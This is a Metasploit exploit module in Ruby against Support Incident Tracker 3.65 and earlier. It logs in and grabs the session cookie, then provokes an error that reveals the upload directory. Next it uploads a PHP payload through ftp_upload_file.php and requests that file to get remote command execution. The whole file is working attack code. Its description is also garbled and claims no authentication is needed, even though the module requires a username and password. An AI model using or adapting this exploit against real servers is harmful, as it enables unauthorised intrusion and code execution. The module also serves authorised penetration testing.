# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Support Incident Tracker <= 3.65 Remote Command Execution&#039;,
            &#039;Description&#039;    => %q{
                    This module combines two separate issues within Support Incident Tracker (<= 3.65)
                application to upload arbitrary data and thus execute a shell. The two issues exist
                in ftp_upload_file.php.
                The first vulnerability exposes the upload dir used to store attachments.
                The second vulnerability allows arbitrary file upload since there is no
                Authentication is required to exploit both vulnerabilities.
            },
            &#039;Author&#039;         =>
                [
                    &#039;Secunia Research&#039;, # Original discovery
                    &#039;juan vazquez&#039;      # Metasploit module
                ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;References&#039;     =>
                [
                    [&#039;CVE&#039;, &#039;CVE-2011-3829&#039;],
                    [&#039;CVE&#039;, &#039;CVE-2011-3833&#039;],
                    [&#039;OSVDB&#039;, &#039;76999&#039;],
                    [&#039;OSVDB&#039;, &#039;77003&#039;],
                    [&#039;URL&#039;, &#039;http://secunia.com/secunia_research/2011-75/&#039;],
                    [&#039;URL&#039;, &#039;http://secunia.com/secunia_research/2011-79/&#039;],
                ],
            &#039;Privileged&#039;     => false,
            &#039;Payload&#039;        =>
                {
                    &#039;DisableNops&#039; => true,
                    &#039;Compat&#039;      =>
                        {
                            &#039;ConnectionType&#039; => &#039;find&#039;,
                        }
                },
            &#039;Platform&#039;       => &#039;php&#039;,
            &#039;Arch&#039;           => ARCH_PHP,
            &#039;Targets&#039;        => [[ &#039;Automatic&#039;, { }]],
            &#039;DisclosureDate&#039; => &#039;Nov 10 2011&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
        register_options(
            [
                OptString.new(&#039;URI&#039;, [true, "SiT! directory path", "/sit"]),
                OptString.new(&#039;USERNAME&#039;, [ true, &#039;The username to authenticate as&#039;,&#039;&#039; ]),
                OptString.new(&#039;PASSWORD&#039;, [ true, &#039;The password for the specified username&#039;,&#039;&#039; ]),
            ], self.class)
    end
 
    def check
 
        if datastore[&#039;URI&#039;][-1, 1] == "/"
            uri = datastore[&#039;URI&#039;] + "index.php"
        else
            uri = datastore[&#039;URI&#039;] + "/index.php"
        end
 
        res = send_request_raw({
            &#039;uri&#039;     => uri
        })
 
        if (res and res.body =~ /SiT! Support Incident Tracker v(\d)\.(\d\d)/)
            ver = [ $1.to_i, $2.to_i ]
            print_status("SiT! #{ver[0]}.#{ver[1]}")
 
            if (ver[0] == 3 and ver[1] == 65)
                return Exploit::CheckCode::Vulnerable
            elsif (ver[0] == 3 and ver[1] < 65)
                return Exploit::CheckCode::Appears
            end
        end
 
        return Exploit::CheckCode::Safe
    end
 
    def retrieve_session(user, pass)
 
        if datastore[&#039;URI&#039;][-1, 1] == "/"
            uri = datastore[&#039;URI&#039;] + "login.php"
        else
            uri = datastore[&#039;URI&#039;] + "/login.php"
        end
 
        res = send_request_cgi({
            &#039;uri&#039;     => uri,
            &#039;method&#039;  => &#039;POST&#039;,
            &#039;data&#039;    => "username=#{user}&password=#{pass}",
        }, 25)
 
        if (res and res.code == 302 and res.headers[&#039;Location&#039;] =~ /main.php/)
            print_status("Successfully logged in as #{user}:#{pass}")
 
            if (res.headers[&#039;Set-Cookie&#039;] =~ /SiTsessionID/) and res.headers[&#039;Set-Cookie&#039;].split("SiTsessionID")[-1] =~ /=(.*);/
                session = $1
                print_status("Successfully retrieved cookie: #{session}")
                return session
            else
                raise RuntimeError, "Error retrieving cookie!"
            end
        else
            raise RuntimeError, "Error logging in."
        end
    end
 
    def upload_page(session, newpage, contents)
 
        if datastore[&#039;URI&#039;][-1, 1] == "/"
            uri = datastore[&#039;URI&#039;] + "ftp_upload_file.php"
        else
            uri = datastore[&#039;URI&#039;] + "/ftp_upload_file.php"
        end
 
        boundary = rand_text_alphanumeric(6)
 
        data = "--#{boundary}\r\n"
        data << "Content-Disposition: form-data; name=\"file\"; "
        data << "filename=\"#{newpage}\"\r\n"
        data << "Content-Type: application/x-httpd-php\r\n\r\n"
        data << contents
        data << "\r\n--#{boundary}\r\n"
        data << "Content-Disposition: form-data; name=\"shortdescription\"\r\n\r\n"
        data << rand_text_alphanumeric(rand(10 + 10))
        data << "\r\n--#{boundary}\r\n"
        data << "Content-Disposition: form-data; name=\"longdescription\"\r\n\r\n"
        data << rand_text_alphanumeric(rand(20) + 20)
        data << "\r\n--#{boundary}\r\n"
        data << "Content-Disposition: form-data; name=\"fileversion\"\r\n\r\n"
        data << "1"
        data << "\r\n--#{boundary}\r\n"
        data << "Content-Disposition: form-data; name=\"action\"\r\n\r\n"
        data << "publish"
        data << "\r\n--#{boundary}--"
 
        res = send_request_raw({
            &#039;uri&#039;     => uri,
            &#039;method&#039;  => &#039;POST&#039;,
            &#039;data&#039;    => data,
            &#039;headers&#039; =>
            {
                &#039;Content-Type&#039;   => &#039;multipart/form-data; boundary=&#039; + boundary,
                &#039;Content-Length&#039; => data.length,
                &#039;Cookie&#039;     => "SiTsessionID=#{session}",
            }
        }, 25)
 
        if (res and res.code == 200)
            print_status("Successfully uploaded #{newpage}")
            return res
        else
            raise RuntimeError, "Error uploading #{newpage}"
        end
    end
 
    def retrieve_upload_dir(session)
        data =  rand_text_alphanumeric(rand(20)+20)
        filename = rand_text_alphanumeric(rand(256) + 300)
        res = upload_page(session, filename, data)
 
        if res.body =~ /attachments-(.*)\/#{filename}\): failed to open stream/
            upload_dir = "attachments-#{$1}"
            print_status("Successfully retrieved upload dir: #{upload_dir}")
            return upload_dir
        else
            raise RuntimeError, "Error retrieving the upload dir"
        end
 
    end
 
    def cmd_shell(cmdpath)
        print_status("Calling payload: #{cmdpath}")
 
        if datastore[&#039;URI&#039;][-1, 1] == "/"
            uri = datastore[&#039;URI&#039;] + cmdpath
        else
            uri = datastore[&#039;URI&#039;] + "/#{cmdpath}"
        end
 
        send_request_raw({
            &#039;uri&#039;   => uri
        }, 25)
        return
    end
 
    def exploit
        cmd_php = &#039;<?php &#039; + payload.encoded + &#039;?>&#039;
        cmdscript   = rand_text_alphanumeric(rand(10)+10) + &#039;.php&#039;
        user        = datastore[&#039;USERNAME&#039;]
        pass        = datastore[&#039;PASSWORD&#039;]
 
        session = retrieve_session(user, pass)
        upload_dir = retrieve_upload_dir(session) # CVE-2011-3829
        upload_page(session, cmdscript, cmd_php) # CVE-2011-3833
        cmdpath = "#{upload_dir}/#{cmdscript}"
        cmd_shell(cmdpath)
        handler
    end
end



